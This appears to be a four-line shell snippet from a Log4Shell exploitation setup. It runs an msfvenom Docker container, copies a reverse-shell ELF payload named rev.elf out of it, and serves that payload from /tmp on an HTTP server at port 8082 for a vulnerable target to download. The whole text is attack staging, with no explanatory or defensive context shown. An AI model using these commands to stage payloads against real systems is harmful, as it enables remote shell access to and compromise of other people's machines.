docker run --name=msfvenom log4jshell/msfvenom
docker cp msfvenom:/tmp/rev.elf /tmp/rev.elf
cd /tmp
python3 -m http.server 8082
